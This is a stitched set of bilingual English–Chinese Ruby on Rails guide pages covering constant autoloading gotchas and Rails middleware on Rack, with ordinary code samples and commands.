Only the leaves that are at least grandchildren need to be loaded this way. Direct subclasses do not need to be preloaded. If the hierarchy is deeper, intermediate classes will be autoloaded recursively from the bottom because their constant will appear in the class definitions as superclass.
只有隔了一代的“枝叶”需要按照这种方式加载。直接子类不需要这样预加载。如果层级更深，中间类将被在底部递归地自动加载进来，因为它们的常量会作为子类出现在类定义中。

###  10.3 Autoloading and require 自动加载和请求

Files defining constants to be autoloaded should never be required:
不应该请求定义了要被自动加载的常量的文件。
require 'user' # DO NOT DO THIS 别来这一句
 
class UsersController < ApplicationController
  ...
end

There are two possible gotchas here in development mode:
开发模式中有两种可能的结局：

    If User is autoloaded before reaching the require, app/models/user.rb runs again because load does not update $LOADED_FEATURES.
    如果User在到达请求语句之前被自动加载，app/models/user.rb会再次运行，因为加载不能更新$LOADED_FEATURES.

    If the require runs first Rails does not mark User as an autoloaded constant and changes to app/models/user.rb aren't reloaded.
    如果请求语句先运行，Rails会将User当作一个还未自动加载的常量，并且app/models/user.rb的改变将不会被重载。

Just follow the flow and use constant autoloading always, never mix autoloading and require. As a last resort, if some file absolutely needs to load a certain file use require_dependency to play nice with constant autoloading. This option is rarely needed in practice, though.
顺着流程，使用常量自动加载总是不会混入自动加载和请求。那就作为最后的手段，如果一些文件绝对需要使用require_dependency加载一个特定文件来和常量自动加载一起运行。尽管实现中这实在罕见。

Of course, using require in autoloaded files to load ordinary 3rd party libraries is fine, and Rails is able to distinguish their constants, they are not marked as autoloaded.
当然，在自动加载的文件里使用请求来加载普通的第三方库是很好的，Rails能够区分它们的常量，它们没有被标记为自动加载的。
###  10.4 Autoloading and Initializers  自动加载和启动器

Consider this assignment in config/initializers/set_auth_service.rb:
思考config/initializers/set_auth_service.rb里的这个分配：
AUTH_SERVICE = if Rails.env.production?
  RealAuthService
else
  MockedAuthService
end

The purpose of this setup would be that the application uses the class that corresponds to the environment via AUTH_SERVICE. In development mode MockedAuthService gets autoloaded when the initializer runs. Let’s suppose we do some requests, change its implementation, and hit the application again. To our surprise the changes are not reflected. Why?
这个设置的目的可能是，程序通过AUTH_SERVICE使用对应环境变量的类。在开发模式下，当启动器运行时，将自动加载MockedAuthService。假设我们做了些请求，改变了它的实现，再次请求程序。令人吃惊的是，改变并没有表现出来。为什么？

As we saw earlier, Rails removes autoloaded constants, but AUTH_SERVICE stores the original class object. Stale, non-reachable using the original constant, but perfectly functional.
正如在前面的《常量重载》一节所述，Rails会删除自动加载的常量，但AUTH_SERVICE保存了原始的类对象。旧的，不可达的使用原来的常量，但完全是功能性的。

The following code summarizes the situation:
下面的代码总结了这一情况：
class C
  def quack
    'quack!'
  end
end
 
X = C
Object.instance_eval { remove_const(:C) }
X.new.quack # => quack!
X.name      # => C
C           # => uninitialized constant C (NameError)

Because of that, it is not a good idea to autoload constants on application initialization.
正因为那样，在程序启动器中自动加载常量不是一个好主意。

In the case above we could implement a dynamic access point:
这种情况下，可以实现一个动态访问点：
# app/models/auth_service.rb
class AuthService
  if Rails.env.production?
    def self.instance
      RealAuthService
    end
  else
    def self.instance
      MockedAuthService
    end
  end
end

and have the application use AuthService.instance instead. AuthService would be loaded on demand and be autoload-friendly.
让程序使用AuthService.instance。AuthService会被按要求加载，并被友好地自动加载。
###  10.5 require_dependency and Initializers 请求依赖和启动器

As we saw before, require_dependency loads files in an autoloading-friendly way. Normally, though, such a call does not make sense in an initializer.
如前所见，请求依赖用一种友好的自动加载方式加载文件。但正常情况下，这样的一个调用不会对启动器有什么真正的影响。

One could think about doing some require_dependency calls in an initializer to make sure certain constants are loaded upfront, for example as an attempt to address the gotcha with STIs.
有一种方式能考虑在启动器中做到请求依赖调用、来确保特定常量是最先加载的，比如尝试用单表继承进行gotcha。

Problem is, in development mode autoloaded constants are wiped if there is any relevant change in the file system. If that happens then we are in the very same situation the initializer wanted to avoid!
问题是，在开发模式下如果在文件系统里存在相关改变，自动加载的常量将被清除。如果被清除，就陷入了启动器竭力避免的一种情况。

Calls to require_dependency have to be strategically written in autoloaded spots.
在已被自动加载的情况下，对请求依赖的调用必须从战略上说是写的。
###  10.6 When Constants aren't Missed 常量没有丢失时
10.6.1 Relative References 相对引用

Let's consider a flight simulator. The application has a default flight model
在看一下飞行模拟器。程序有一个默认的飞行模式：
# app/models/flight_model.rb
class FlightModel
end

that can be overridden by each airplane, for instance
该模式可以被每一架飞机（举个例子来说）改写。
# app/models/bell_x1/flight_model.rb
module BellX1
  class FlightModel < FlightModel
  end
end
 
# app/models/bell_x1/aircraft.rb
module BellX1
  class Aircraft
    def initialize
      @flight_model = FlightModel.new
    end
  end
end

The initializer wants to create a BellX1::FlightModel and nesting has BellX1, that looks good. But if the default flight model is loaded and the one for the Bell-X1 is not, the interpreter is able to resolve the top-level FlightModel and autoloading is thus not triggered for BellX1::FlightModel.
启动器想创建一个BellX1::FlightModel，嵌套中有BellX1，看起来不错。但如果默认飞行模式被加载，而Bell-X1没有，解释器能解析顶级的飞行模式，因此BellX1::FlightModel没有触发自动加载。

That code depends on the execution path.
那个代码取决于执行路径。

These kind of ambiguities can often be resolved using qualified constants:
这种不确定性经常会被使用限定常量来解析。
module BellX1
  class Plane
    def flight_model
      @flight_model ||= BellX1::FlightModel.new
    end
  end
end

Also, require_dependency is a solution:
同样，请求依赖是解决方法。
require_dependency 'bell_x1/flight_model'
 
module BellX1
  class Plane
    def flight_model
      @flight_model ||= FlightModel.new
    end
  end
end
10.6.2 Qualified References  限定引用

Given
给定
# app/models/hotel.rb
class Hotel
end
 
# app/models/image.rb
class Image
end
 
# app/models/hotel/image.rb
class Hotel
  class Image < Image
  end
end

the expression Hotel::Image is ambiguous, depends on the execution path.
表达式Hotel::Image是不确定的，取决于执行路径。

As we saw before, Ruby looks up the constant in Hotel and its ancestors. If app/models/image.rb has been loaded but app/models/hotel/image.rb hasn't, Ruby does not find Image in Hotel, but it does in Object:
正如前面的《合格常量的解析运算》一节所见，Ruby在Hotel里查找常量和它的超类。如果app/models/image.rb已经被加载，但app/models/hotel/image.rb还没有，Ruby不能在Hotel里找到Image，但在Object里找到了。

$ bin/rails r 'Image; p Hotel::Image' 2>/dev/null
Image # NOT Hotel::Image!

The code evaluating Hotel::Image needs to make sure app/models/hotel/image.rb has been loaded, possibly with require_dependency.
评估Hotel::Image的代码需要确保app/models/hotel/image.rb文件已被加载，需要使用请求依赖。

In these cases the interpreter issues a warning though:
不过在这些例子中，解释器发出一个警告：
warning: toplevel constant Image referenced by Hotel::Image

This surprising constant resolution can be observed with any qualifying class:
这个令人吃惊的常量解析可以被任何合格类观察到。
####  2.1.5 :001 > String::Array
(irb):1: warning: toplevel constant Array referenced by String::Array
 => Array

To find this gotcha the qualifying namespace has to be a class, Object is not an ancestor of modules.
要找到这个收场，合格命名空间必须是个类，Object不是模块的超类。
###  10.7 Autoloading within Singleton Classes 在单例类里自动加载

Let's suppose we have these class definitions:
假设我们有下面这些类定义：
# app/models/hotel/services.rb
module Hotel
  class Services
  end
end
 
# app/models/hotel/geo_location.rb
module Hotel
  class GeoLocation
    class << self
      Services
    end
  end
end

If Hotel::Services is known by the time app/models/hotel/geo_location.rb is being loaded, Services is resolved by Ruby because Hotel belongs to the nesting when the singleton class of Hotel::GeoLocation is opened.
如果Hotel::Services在app/models/hotel/geo_location.rb已加载时为已知，因为当Hotel::GeoLocation的单列类被打开时Hotel属于嵌套，Services会被Ruby解析。

But if Hotel::Services is not known, Rails is not able to autoload it, the application raises NameError.
但如果Hotel::Services为未知，Rails就不能自动加载它，程序将抛出NameError异常。

The reason is that autoloading is triggered for the singleton class, which is anonymous, and as we saw before, Rails only checks the top-level namespace in that edge case.
理由是，为了匿名的单例类，自动加载被触发了。正如在前面《一般流程》里所见，Rails只会在那种极端情况下检出顶级命名空间。

An easy solution to this caveat is to qualify the constant:
这种问题的建议解决方案是认证常量：
module Hotel
  class GeoLocation
    class << self
      Hotel::Services
    end
  end
end
###  10.8 Autoloading in BasicObject 在基本对象里自动加载

Direct descendants of BasicObject do not have Object among their ancestors and cannot resolve top-level constants:
基本对象的直接后代，其超类中没有Object，所以不能解析顶级常量。
class C < BasicObject
  String # NameError: uninitialized constant C::String
end

When autoloading is involved that plot has a twist. Let's consider:
在该处放入自动加载会出现麻烦。想想下面：
class C < BasicObject
  def user
    User # WRONG
  end
end

Since Rails checks the top-level namespace User gets autoloaded just fine the first time the user method is invoked. You only get the exception if the User constant is known at that point, in particular in a second call to user:
因为user方法被调用的第一时间，Rails检查到顶级命名空间User刚好得到自动加载。如果在那个点上User常量为已知，就会抛出异常了，特别是在第二次调用user的时候：
c = C.new
c.user # surprisingly fine, User
c.user # NameError: uninitialized constant C::User

because it detects a parent namespace already has the constant (see Qualified References.)
因为它侦测到一个父类命名空间已经有了常量（参见上面的限定引用）。

As with pure Ruby, within the body of a direct descendant of BasicObject use always absolute constant paths:
和纯Ruby一样，在基本对象的直接后代的主体里使用，总是使用绝对常量路径：
class C < BasicObject
  ::String # RIGHT
 
  def user
    ::User # RIGHT
  end
end

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Rails on Rack

本文介绍 Rails 和 Rack 的集成，以及与其他 Rack 组件的配合。

读完本文，你将学到：

    如何在 Rails 程序中使用中间件；
    Action Pack 内建的中间件；
    如何编写中间件；

Chapters

    Rack 简介
    Rails on Rack
        Rails 程序中的 Rack 对象
        rails server
        rackup
    Action Dispatcher 中间件
        查看使用的中间件
        设置中间件
        内部中间件
    参考资源
        学习
        理解中间件

阅读本文之前需要了解 Rack 协议及相关概念，如中间件、URL 映射和 Rack::Builder。
##  1 Rack 简介

Rack 为使用 Ruby 开发的网页程序提供了小型模块化，适应性极高的接口。Rack 尽量使用最简单的方式封装 HTTP 请求和响应，为服务器、框架和二者之间的软件（中间件）提供了统一的 API，只要调用一个简单的方法就能完成一切操作。

    Rack API 文档

详细解说 Rack 不是本文的目的，如果不知道 Rack 基础知识，可以阅读“参考资源”一节。
##  2 Rails on Rack
###  2.1 Rails 程序中的 Rack 对象

ApplicationName::Application 是 Rails 程序中最主要的 Rack 程序对象。任何支持 Rack 的服务器都应该使用 ApplicationName::Application 对象服务 Rails 程序。Rails.application 也指向 ApplicationName::Application 对象。
###  2.2 rails server

rails server 命令会创建 Rack::Server 对象并启动服务器。

rails server 创建 Rack::Server 实例的方法如下：
Rails::Server.new.tap do |server|
  require APP_PATH
  Dir.chdir(Rails.application.root)
  server.start
end

Rails::Server 继承自 Rack::Server，使用下面的方式调用 Rack::Server#start 方法：
class Server < ::Rack::Server
  def start
    ...
    super
  end
end

Rails::Server 加载中间件的方式如下：
def middleware
  middlewares = []
  middlewares << [Rails::Rack::Debugger] if options[:debugger]
  middlewares << [::Rack::ContentLength]
  Hash.new(middlewares)
end

Rails::Rack::Debugger 基本上只在开发环境中有用。下表说明了加载的各中间件的用途：
中间件 	用途
Rails::Rack::Debugger 	启用调试功能
Rack::ContentLength 	计算响应的长度，单位为字节，然后设置 HTTP Content-Length 报头
###  2.3 rackup

如果想用 rackup 代替 rails server 命令，可以在 Rails 程序根目录下的 config.ru 文件中写入下面的代码：
# Rails.root/config.ru
require ::File.expand_path('../config/environment', __FILE__)
 
use Rails::Rack::Debugger
use Rack::ContentLength
run Rails.application

然后使用下面的命令启动服务器：
$ rackup config.ru

查看 rackup 的其他选项，可以执行下面的命令：
$ rackup --help
##  3 Action Dispatcher 中间件

Action Dispatcher 中的很多组件都以 Rack 中间件的形式实现。Rails::Application 通过 ActionDispatch::MiddlewareStack 把内部和外部的中间件组合在一起，形成一个完整的 Rails Rack 程序。

在 Rails 中，ActionDispatch::MiddlewareStack 的作用和 Rack::Builder 一样，不过前者更灵活，也为满足 Rails 的需求加入了更多功能。
###  3.1 查看使用的中间件

Rails 提供了一个 rake 任务，用来查看使用的中间件：
$ rake middleware

在新建的 Rails 程序中，可能会输出如下结果：
use Rack::Sendfile
use ActionDispatch::Static
use Rack::Lock
use #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x000000029a0838>
use Rack::Runtime
use Rack::MethodOverride
use ActionDispatch::RequestId
use Rails::Rack::Logger
use ActionDispatch::ShowExceptions
use ActionDispatch::DebugExceptions
use ActionDispatch::RemoteIp
use ActionDispatch::Reloader
use ActionDispatch::Callbacks
use ActiveRecord::Migration::CheckPending
use ActiveRecord::ConnectionAdapters::ConnectionManagement
use ActiveRecord::QueryCache
use ActionDispatch::Cookies
use ActionDispatch::Session::CookieStore
use ActionDispatch::Flash
use ActionDispatch::ParamsParser
use Rack::Head
use Rack::ConditionalGet
use Rack::ETag
run MyApp::Application.routes

这里列出的各中间件在“内部中间件”一节有详细介绍。
###  3.2 设置中间件

Rails 在 application.rb 和 environments/<environment>.rb 文件中提供了一个简单的设置项 config.middleware，可以添加新中间件，删除再用的中间件，或者修改中间件的加载顺序。
####  3.2.1 添加新中间件

使用下面列出的任何一种方法都可以添加新中间件：

    config.middleware.use(new_middleware, args)：把新中间件添加到列表末尾；
    config.middleware.insert_before(existing_middleware, new_middleware, args)：在 existing_middleware 之前添加新中间件；
    config.middleware.insert_after(existing_middleware, new_middleware, args)：在 existing_middleware 之后添加新中间件；

# config/application.rb
 
# Push Rack::BounceFavicon at the bottom
config.middleware.use Rack::BounceFavicon
 
# Add Lifo::Cache after ActiveRecord::QueryCache.
# Pass { page_cache: false } argument to Lifo::Cache.
config.middleware.insert_after ActiveRecord::QueryCache, Lifo::Cache, page_cache: false
####  3.2.2 替换中间件

使用 config.middleware.swap 可以替换现有的中间件：
# config/application.rb
 
# Replace ActionDispatch::ShowExceptions with Lifo::ShowExceptions
config.middleware.swap ActionDispatch::ShowExceptions, Lifo::ShowExceptions
####  3.2.3 删除中间件

在程序的设置文件中加入下面的代码：
# config/application.rb
config.middleware.delete "Rack::Lock"

现在查看所用的中间件，会发现 Rack::Lock 不在输出结果中。
$ rake middleware
(in /Users/lifo/Rails/blog)
use ActionDispatch::Static
use #<ActiveSupport::Cache::Strategy::LocalCache::Middleware:0x00000001c304c8>
use Rack::Runtime
...
run Blog::Application.routes

如果想删除会话相关的中间件，可以这么做：
# config/application.rb
config.middleware.delete "ActionDispatch::Cookies"
config.middleware.delete "ActionDispatch::Session::CookieStore"
config.middleware.delete "ActionDispatch::Flash"

删除浏览器相关的中间件：
# config/application.rb
config.middleware.delete "Rack::MethodOverride"
###  3.3 内部中间件

Action Controller 的很多功能都以中间件的形式实现。下面解释个中间件的作用。

Rack::Sendfile：设置服务器上的 X-Sendfile 报头。通过 config.action_dispatch.x_sendfile_header 选项设置。

ActionDispatch::Static：用来服务静态资源文件。如果选项 config.serve_static_assets 为 false，则禁用这个中间件。

Rack::Lock：把 env["rack.multithread"] 旗标设为 false，程序放入互斥锁中。

ActiveSupport::Cache::Strategy::LocalCache::Middleware：在内存中保存缓存，非线程安全。

Rack::Runtime：设置 X-Runtime 报头，即执行请求的时长，单位为秒。

Rack::MethodOverride：如果指定了 params[:_method] 参数，会覆盖所用的请求方法。这个中间件实现了 PUT 和 DELETE 方法。

ActionDispatch::RequestId：在响应中设置一个唯一的 X-Request-Id 报头，并启用 ActionDispatch::Request#uuid 方法。

Rails::Rack::Logger：请求开始时提醒日志，请求完成后写入日志。

ActionDispatch::ShowExceptions：补救程序抛出的所有异常，调用处理异常的程序，使用特定的格式显示给用户。

ActionDispatch::DebugExceptions：如果在本地开发，把异常写入日志，并显示一个调试页面。

ActionDispatch::RemoteIp：检查欺骗攻击的 IP。

ActionDispatch::Reloader：提供“准备”和“清理”回调，协助开发环境中的代码重新加载功能。

ActionDispatch::Callbacks：在处理请求之前调用“准备”回调。

ActiveRecord::Migration::CheckPending：检查是否有待运行的迁移，如果有就抛出 ActiveRecord::PendingMigrationError 异常。

ActiveRecord::ConnectionAdapters::ConnectionManagement：请求处理完成后，清理活跃的连接，除非在发起请求的环境中把 rack.test 设为 true。

ActiveRecord::QueryCache：启用 Active Record 查询缓存。

ActionDispatch::Cookies：设置请求的 cookies。

ActionDispatch::Session::CookieStore：负责把会话存储在 cookies 中。

ActionDispatch::Flash：设置 Flash 消息的键。只有设定了 config.action_controller.session_store 选项时才可用。

ActionDispatch::ParamsParser：把请求中的参数出入 params。

ActionDispatch::Head：把 HEAD 请求转换成 GET 请求，并处理。

Rack::ConditionalGet：添加对“条件 GET”的支持，如果页面未修改，就不响应。

Rack::ETag：为所有字符串类型的主体添加 ETags 报头。ETags 用来验证缓存。

设置 Rack 时可使用上述任意一个中间件。
##  4 参考资源
###  4.1 学习

    Rack 官网
    Rack 简介
    Ruby on Rack #1 - Hello Rack!
    Ruby on Rack #2 - The Builder

###  4.2 理解中间件

    Railscast 介绍 Rack 中间件的视频

## 反馈

欢迎帮忙改善指南质量。

如发现任何错误，欢迎修正。开始贡献前，可先行阅读贡献指南：文档。

翻译如有错误，深感抱歉，欢迎 Fork 修正，或至此处回报。

文章可能有未完成或过时的内容。请先检查 Edge Guides 来确定问题在 master 是否已经修掉了。再上 master 补上缺少的文件。内容参考 Ruby on Rails 指南准则来了解行文风格。

最后，任何关于 Ruby on Rails 文档的讨论，欢迎到 rubyonrails-docs 邮件群组。

本著作采用创用 CC 姓名标示-相同方式分享 4.0 国际授权条款授权。

“Rails”、“Ruby on Rails”，以及 Rails logo 为 David Heinemeier Hansson 的商标。版权所有。

——————————————————————————————————
#  Autoloading and Reloading Constants 自动加载、重载常量

This guide documents how constant autoloading and reloading works.
这个指南记述了常量怎么加载、重载。

After reading this guide, you will know:
读完这个指南，你将会知道：

    Key aspects of Ruby constants
    Ruby常量的关键方面
    What is autoload_paths
    什么是自动加载路径
    How constant autoloading works
    常量怎么自动加载
    What is require_dependency
    什么是请求依赖
    How constant reloading works
    常量怎么重载
    Solutions to common autoloading gotchas
    普通自动加载gotchas的解决方案

Chapters

    Introduction 介绍
    Constants Refresher 常量刷新器
        Nesting 嵌套
        Class and Module  Definitions are Constant Assignments 类和模型定义是常量赋值
        Constants are Stored in Modules 常量保存在模块中
        Resolution Algorithms 解析运算
    Vocabulary 词汇表
        Parent Namespaces 父层命名空间
        Loading Mechanism 加载机制
    Autoloading Availability 自动加载效应
    autoload_paths 自动加载路径
    Autoloading Algorithms  自动加载运算
        Relative References 相对引用
        Qualified References 限定引用
        Automatic Modules 自动模块
        Generic Procedure 一般过程
    require_dependency 请求依赖
    Constant Reloading 常量重载
    Module#autoload isn't Involved 自动加载不是调用
    Common Gotchas 普通收场
        Nesting and Qualified Constants 嵌套和限定常量
        Autoloading and STI 自动加载和单表继承
        Autoloading and require 自动加载和请求
        Autoloading and Initializers 自动加载和启动器
        require_dependency and Initializers 请求依赖和启动器
        When Constants aren't Missed 常量丢失时
        Autoloading within Singleton Classes 单例类内的自动加载
        Autoloading in BasicObject 基本对象内的自动加载

##  1 Introduction 介绍

Ruby on Rails allows applications to be written as if their code was preloaded.
Ruby on Rails 让程序写起来就像这些代码被预加载一样。

In a normal Ruby program classes need to load their dependencies:
普通Ruby程序的类需要加载依赖：
require 'application_controller'
require 'post'
 
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

Our Rubyist instinct quickly sees some redundancy in there: If classes were defined in files matching their name, couldn't their loading be automated somehow? We could save scanning the file for dependencies, which is brittle.
我们的Ruby程序员出于本能迅速地看到里面的累赘：如果类被定义在同名文件中，难道它们不能被自动加载吗？我们可以省掉扫描依赖文件这种麻烦的工作。

Moreover, Kernel#require loads files once, but development is much more smooth if code gets refreshed when it changes without restarting the server. It would be nice to be able to use Kernel#load in development, and Kernel#require in production.
还有， Kernel#require 只加载一次文件，但如果代码可以在自身改变的时候无需重启服务器就重新刷新，那开发过程会更顺畅。在开发环境中使用Kernel#load，到了生产环境中才使用Kernel#require ，应该会更好。

Indeed, those features are provided by Ruby on Rails, where we just write
确实，Ruby on Rails提供了那些特性，我们只需要这样写：
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

This guide documents how that works.
这个指南记录了这些功能是怎么运行的。
##  2 Constants Refresher 常量重刷新器

While constants are trivial in most programming languages, they are a rich topic in Ruby.
常量在大部分的编程语言中是地位低微的，但在Ruby中却话题多多。

It is beyond the scope of this guide to document Ruby constants, but we are nevertheless going to highlight a few key topics. Truly grasping the following sections is instrumental to understanding constant autoloading and reloading.
说明Ruby常量，这超出了本指南的范围，但这里有必要指出一些关键的地方。真正消化下面几个小节的内容，就可理解常量的自动加载和重载。
###  2.1 Nesting 嵌套

Class and module definitions can be nested to create namespaces:
类和模块定义可被嵌套，以创建命名空间。
module XML
  class SAXParser
    # (1)
  end
end

The nesting at any given place is the collection of enclosing nested class and module objects outwards. For example, in the previous example, the nesting at (1) is
任何地方的嵌套都是外向的嵌套了的类和模块的封装的对象的集合。比如前面的例子，位置(1)的嵌套是：
[XML::SAXParser, XML]

It is important to understand that the nesting is composed of class and module objects, it has nothing to do with the constants used to access them, and is also unrelated to their names.
嵌套是类和模块对象的组合，理解这点很重要。嵌套对用来进入其中的常量没有影响，也和常量的名称毫不相干。

For instance, while this definition is similar to the previous one:
比如，虽然这个定义很像前面的那个：
class XML::SAXParser
  # (2)
end

the nesting in (2) is different:
但嵌套(2)是不同的：
[XML::SAXParser]

XML does not belong to it.
XML不属于它。

We can see in this example that the name of a class or module that belongs to a certain nesting does not necessarily correlate with the namespaces at the spot.
在这个例子中，可以看到类或模块的名称属于特定嵌套，该嵌套不一定对应着该类或模块的命名空间。

Even more, they are totally independent, take for instance
甚至，它们是完全无关的，比如：
module X::Y
  module A::B
    # (3)
  end
end

The nesting in (3) consists of two module objects:
(3)的嵌套包含两个模块对象：
[A::B, X::Y]

So, it not only doesn't end in A, which does not even belong to the nesting, but it also contains X::Y, which is independent from A::B.
那么，它没有停留于A中，A甚至不属于该嵌套，但它包含了X::Y,而X::Y独立于A::B。

The nesting is an internal stack maintained by the interpreter, and it gets modified according to these rules:
嵌套是一个由解释器维护的内部堆栈，并根据下面这些规则进行修改：

    The class object following a class keyword gets pushed when its body is executed, and popped after it.
    主体执行时，跟在class关键字后面的类对象被推进堆栈，执行之后又从堆栈中被弹出。

    The module object following a module keyword gets pushed when its body is executed, and popped after it.
    主体执行时，跟在module关键字后面的模块对象被推进堆栈，执行之后又从堆栈中被弹出。

    A singleton class opened with class << object gets pushed, and popped later.
    用`类 << 对象`打开的单例类被推进堆栈，稍后被弹出。

    When any of the *_eval family of methods is called using a string argument, the singleton class of the receiver is pushed to the nesting of the eval'ed code.
    带着一个字符串参数调用任何`*_eval`系列的方法，接收者的单例类被推进执行eval的代码的嵌套中。

    The nesting at the top-level of code interpreted by Kernel#load is empty unless the load call receives a true value as second argument, in which case a newly created anonymous module is pushed by Ruby.
    由Kernel#load解释的顶级代码里的嵌套为空，除非load调用接收了一个真值作为第二参数，这种情况下由Ruby将新建的匿名类推入堆栈中。

It is interesting to observe that blocks do not modify the stack. In particular the blocks that may be passed to Class.new and Module.new do not get the class or module being defined pushed to their nesting. That's one of the differences between defining classes and modules in one way or another.
有意思的是代码块不会修改堆栈。特别是，可传给Class.new和Module.new的代码块不会将已经定义好的类或模块推入它们的嵌套中。这是这两种定义类和模块的方式的一个差别。

The nesting at any given place can be inspected with Module.nesting.
任何指定地方的嵌套可被视为模块的嵌套。
###  2.2 Class and Module Definitions are Constant Assignments  类和模块的定义是常量分配


Let's suppose the following snippet creates a class (rather than reopening it):
假设下面的片段创建了一个类（不是重新打开它）：
class C
end

Ruby creates a constant C in Object and stores in that constant a class object. The name of the class instance is "C", a string, named after the constant.
Ruby在Object里创建了一个常量C，并在该变量里存储了一个类对象。类名对象是“C”，一个字符串，在常量之后命名。

That is, 
就是说，
class Project < ActiveRecord::Base
end

performs a constant assignment equivalent to
执行了一个常数分配，相当于
Project = Class.new(ActiveRecord::Base)

including setting the name of the class as a side-effect:    
这段代码包含一个副作用：设置了类的名称。
Project.name # => "Project"

Constant assignment has a special rule to make that happen: if the object being assigned is an anonymous class or module, Ruby sets the object's name to the name of the constant.
常量分配有一个特别的规则，如果被分配的对象是一个匿名的类或模块，Ruby将对象的名称设置为常量的名称。

From then on, what happens to the constant and the instance does not matter. For example, the constant could be deleted, the class object could be assigned to a different constant, be stored in no constant anymore, etc. Once the name is set, it doesn't change.
从那开始，常量和实例发生什么变化就不重要了。比如，常量可以被删除，类对象可被分配到不同的常量，不再存储在常量上，等等。一旦设置了名称，类对象就不会变化。

Similarly, module creation using the module keyword as in
类似的，模块的创建使用了module关键字，正如：
module Admin
end

performs a constant assignment equivalent to
执行了一个常量分配，相当于
Admin = Module.new

including setting the name as a side-effect:
但也有副产品：设置了名称。
Admin.name # => "Admin"

The execution context of a block passed to Class.new or Module.new is not entirely equivalent to the one of the body of the definitions using the class and module keywords. But both idioms result in the same constant assignment.
被传递到Class.new或Module.new代码块的执行环境不会完全等同于使用了class和module关键字的定义的主体。但这两种形式会产生同样的常量分配。

Thus, when one informally says "the String class", that really means: the class object stored in the constant called "String" in the class object stored in the Object constant. String is otherwise an ordinary Ruby constant and everything related to constants such as resolution algorithms applies to it.
因此，当一个人说“字符串类”的时候，他真实的意思是：该类对象存储在一个叫做‘String’的常量中，而该常量在一个class对象里面，该class对象则存储在一个Object常量中。字符串类只不过是一个普通的Ruby常量，再加上所有与这个常量相关的东西，比如应用在它身上的解析算法。

Likewise, in the controller
类似的，在控制器里
class PostsController < ApplicationController
  def index
    @posts = Post.all
  end
end

Post is not syntax for a class. Rather, Post is a regular Ruby constant. If all is good, the constant evaluates to an object that responds to all.
Post不是类的构造语法。相反，Post是一个普通的Ruby常量。如果正常运作，该常量被当作响应一切的对象。

That is why we talk about constant autoloading, Rails has the ability to load constants on the fly.
那就是为什么谈论常量自动加载的原因，Rails有能力快速加载常量。
###  2.3 Constants are Stored in Modules  常量存在模块里面

Constants belong to modules in a very literal sense. Classes and modules have a constant table; think of it as a hash table.
从字面来看，常量属于模块。类和模块有一个常量表，该表可以看作一个散列表。

Let's analyze an example to really understand what that means. While common abuses of language like "the String class" are convenient, the exposition is going to be precise here for didactic purposes.
下面分析一个例子来真正地理解其中的意思。因为普遍滥用语言——比如说“字符串类”——实在太方便了；这里展示的情况一针见血。

Let's consider the following module definition:
想想下面的模块定义：
module Colors
  RED = '0xff0000'
end

First, when the module keyword is processed the interpreter creates a new entry in the constant table of the class object stored in the Object constant. Said entry associates the name "Colors" to a newly created module object. Furthermore, the interpreter sets the name of the new module object to be the string "Colors".
首先，module关键字被处理时，解释器在Object常量里的class对象的常量表中创建了一个新的条目。这个条目将“Colors”这个名称和一个新建的模块对象联系在一起。另外，解释器将新的模块对象的名称设置为字符串“Colors”。

Later, when the body of the module definition is interpreted, a new entry is created in the constant table of the module object stored in the Colors constant. That entry maps the name "RED" to the string "0xff0000".
稍后，当模块定义的主体被解释时，存储在Colors常量的模块对象的常量表创建了一个新的条目。该条目将RED映射到字符串0xff0000中。

In particular, Colors::RED is totally unrelated to any other RED constant that may live in any other class or module object. If there were any, they would have separate entries in their respective constant tables.
特别是，Colors::RED是和其他存在于其他类或模块对象的RED常量完全无关的。如果它处还有RED，那它们在相应的常量表中一定有独立的条目。

Pay special attention in the previous paragraphs to the distinction between class and module objects, constant names, and value objects associated to them in constant tables.
要特别注意前一段里类和模块对象之间的差别，常量的名称，与常量关联的对象在常量表中的值。
###  2.4 Resolution Algorithms  解析运算
####  2.4.1 Resolution Algorithm for Relative Constants  为相对常量进行解析运算

At any given place in the code, let's define cref to be the first element of the nesting if it is not empty, or Object otherwise.
在代码的任何指定位置，如果嵌套不是空的，定义cref为嵌套的第一个元素；否则，定义cref为Object。

Without getting too much into the details, the resolution algorithm for relative constant references goes like this:
不用怎么深入，相对常量引用的解析运算会是这样：

    If the nesting is not empty the constant is looked up in its elements and in order. The ancestors of those elements are ignored.
    如果嵌套不为空，常量会按次序寻找各个元素。这些元素的祖先则被忽略。

    If not found, then the algorithm walks up the ancestor chain of the cref.
    如果没有找到，那么运算将沿着cref的祖先链向上寻找。

    If not found, const_missing is invoked on the cref. The default implementation of const_missing raises NameError, but it can be overridden.
    如果没有找到，cref将调用const_missing。const_missing的默认执行是抛出NameError异常，但这个执行可以被改写。

Rails autoloading does not emulate this algorithm, but its starting point is the name of the constant to be autoloaded, and the cref. See more in Relative References.
Rails自动加载不会模拟这个运算，但它的起始点是要自动加载的常量的名称和cref。详见下面的相对引用。
####  2.4.2 Resolution Algorithm for Qualified Constants 限定常量的解析运算

Qualified constants look like this:
限定常量看起来就像：
Billing::Invoice

Billing::Invoice is composed of two constants: Billing is relative and is resolved using the algorithm of the previous section.
Billing::Invoice由两个常量组成。Billing是相对常量，可使用前一节的运算来解析。

Leading colons would make the first segment absolute rather than relative: ::Billing::Invoice. That would force Billing to be looked up only as a top-level constant.
::Billing::Invoice的前置冒号可以让前置部分变成绝对路径而不是相对路径，会强制Billing作为顶级常量。

Invoice on the other hand is qualified by Billing and we are going to see its resolution next. Let's call parent to that qualifying class or module object, that is, Billing in the example above. The algorithm for qualified constants goes like this:
另一方面，Invoice被Billing所限定，下面会看到它的解析。让我们调用parent到限定的类或模块对象，也就是上面例子中的Billing。

    The constant is looked up in the parent and its ancestors.
    常量在父类和祖类中查找。

